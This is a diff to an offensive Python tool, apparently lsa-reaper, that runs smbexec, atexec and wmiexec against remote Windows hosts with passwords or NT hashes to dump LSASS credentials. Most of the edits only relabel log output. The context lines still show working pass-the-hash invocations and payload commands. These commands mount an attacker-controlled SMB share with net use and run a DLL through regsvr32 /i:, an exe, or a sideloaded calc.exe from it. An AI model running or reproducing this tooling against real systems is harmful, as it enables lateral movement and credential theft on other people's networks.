@@ -220,7 +220,7 @@ class SMBEXECShell():
                         command2run = command2run[command2run.find('&&') + 3:]
                         tmphold = self.send_data(command2run[:command2run.find('&')], addr)
                 else:
-                    printnlog('{}: {}'.format(addr, tmphold))
+                    printnlog('{}: SMBEXEC net use failed: {}'.format(addr, tmphold))
 
         except BaseException as e:
             if str(e).lower().find('dce') != -1:
@@ -243,9 +243,9 @@ class SMBEXECShell():
                         while data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:  # this should work if we get a statys_object_name_not_found error to just rerun smbexec until it works
                             data_out = subprocess.getoutput('python3 {}/smbexec-shellless.py {}/{}:\'{}\'@{}  \'{}\''.format(cwd, domain, username, password, addr, command2run))
                             if logging.getLogger().level == logging.DEBUG:
-                                printnlog('{}: {}'.format(addr, data_out))
+                                printnlog('{}: DATA_OUT1: {}'.format(addr, data_out))
                             else:
-                                lognoprint('{}: {}'.format(addr, data_out))
+                                lognoprint('{}: DATA_OUT2: {}'.format(addr, data_out))
                             if retries >= 12 and data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:
                                 printnlog('{}[!]{} {}: Max Retries hit, skipping'.format(color_YELL, color_reset, addr))
                                 break
@@ -264,9 +264,9 @@ class SMBEXECShell():
                         while data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:  # this should work if we get a statys_object_name_not_found error to just rerun smbexec until it works
                             data_out = subprocess.getoutput('python3 {}/smbexec-shellless.py {}/{}@{} -hashes \'{}\' \'{}\''.format(cwd, domain, username, addr, nthash, command2run))
                             if logging.getLogger().level == logging.DEBUG: # logging stuff
-                                printnlog('{}: {}'.format(addr, data_out))
+                                printnlog('{}: DATA_OUT3: {}'.format(addr, data_out))
                             else:
-                                lognoprint('{}: {}'.format(addr, data_out))
+                                lognoprint('{}: DATA_OUT4: {}'.format(addr, data_out))
                             if retries >= 12 and data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:
                                 printnlog('{}[!]{} {}: Max Retries hit, skipping'.format(color_YELL, color_reset, addr))
                                 break
@@ -274,9 +274,9 @@ class SMBEXECShell():
                                 retries += 1
 
                     if logging.getLogger().level == logging.DEBUG:
-                        printnlog('{}: {}'.format(addr, data_out))
+                        printnlog('{}: DATA_OUT5: {}'.format(addr, data_out))
                     else:
-                        lognoprint('{}: {}'.format(addr, data_out))
+                        lognoprint('{}: DATA_OUT6: {}'.format(addr, data_out))
                 else:
                     printnlog('You dont seem to have {}/smbexec-shellless.py you should put that in the same directory as lsa-reaper.py as it is required'.format(cwd))
             else:
@@ -372,7 +372,7 @@ class SMBEXECShell():
                 logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                               'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py '
                               'again with -codec and the corresponding codec')
-                printnlog('{}: {}\n'.format(addr, self.__outputBuffer.decode(CODEC, errors='replace')))
+                printnlog('{}: decode error: {}\n'.format(addr, self.__outputBuffer.decode(CODEC, errors='replace')))
             with open('{}/drives.txt'.format(cwd), 'a') as f:  # writing to a file gets around the issue of multithreading not being easily readable
                 f.write(self.__outputBuffer.decode(CODEC, errors='replace'))
                 f.close()
@@ -432,7 +432,7 @@ class TSCH_EXEC:
                 logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                               'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute atexec.py '
                               'again with -codec and the corresponding codec')
-                printnlog('{}: {}'.format(addr, data.decode(CODEC, errors='replace')))
+                printnlog('{}: decode error1 {}'.format(addr, data.decode(CODEC, errors='replace')))
 
         def xml_escape(data):
             replace_table = {
@@ -726,7 +726,7 @@ class RemoteShell(cmd.Cmd):
             self.execute_remote(line)
             if len(self.__outputBuffer.strip('\r\n')) > 0:
                 # Something went wrong
-                printnlog(self.__outputBuffer)
+                printnlog('wmiexec output error: {}'.format(self.__outputBuffer))
                 self.__outputBuffer = ''
             else:
                 # Drive valid, now we should get the current path
@@ -2561,7 +2561,7 @@ def auto_parse():
                         else:
                             printnlog('{}[!]{} Skipping {} because of duplicate creds'.format(color_BLU, color_reset, item))
                     except Exception as e:
-                        printnlog(str(e))
+                        printnlog('Cred check error: {}'.format(str(e)))
                 printnlog("")
             else:
                 printnlog('{} There are no creds to check'.format(red_minus))
@@ -2714,9 +2714,9 @@ def relayx_dump_mt_execute(reaper_command, relayx_dat):
         else:
             retries += 1
     if logging.getLogger().level == logging.DEBUG:  # if were debugging print the output of smbexec-shellless
-        printnlog(data_out)
+        printnlog('DATA_OUT7: {}'.format(data_out))
     else:  # otherwise just log it to the outputfile
-        lognoprint(data_out)
+        lognoprint('DATA_OUT8: {}'.format(data_out))
 
     printnlog('{}[+]{} {}: Completed'.format(color_BLU, color_reset, relayx_dat[1]))
 
@@ -3399,7 +3399,7 @@ if __name__ == '__main__':
         elif options.payload == 'regsvr32-mdwdpss' or options.payload == 'regsvr32-mdwd' or options.payload == 'regsvr32-rtlcp':
             command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\System32\regsvr32.exe /s /i:{},{}.txt {}:\{}.dll {}&& net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, addresses_file, drive_letter, payload_name, cleanup, drive_letter)
         elif options.payload == 'exe-mdwdpss' or options.payload == 'exe-mdwd' or options.payload == 'exe-rtlcp':
-            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\{}.exe {}&& net use {}: /delete /yes'.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, cleanup, drive_letter)
+            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\{}.exe {}&& net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, cleanup, drive_letter)
         elif options.payload == 'dllsideload-mdwdpss' or options.payload == 'dllsideload-mdwd' or options.payload == 'dllsideload-rtlcp':
             command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\calc.exe {}&& net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, cleanup, drive_letter)
 
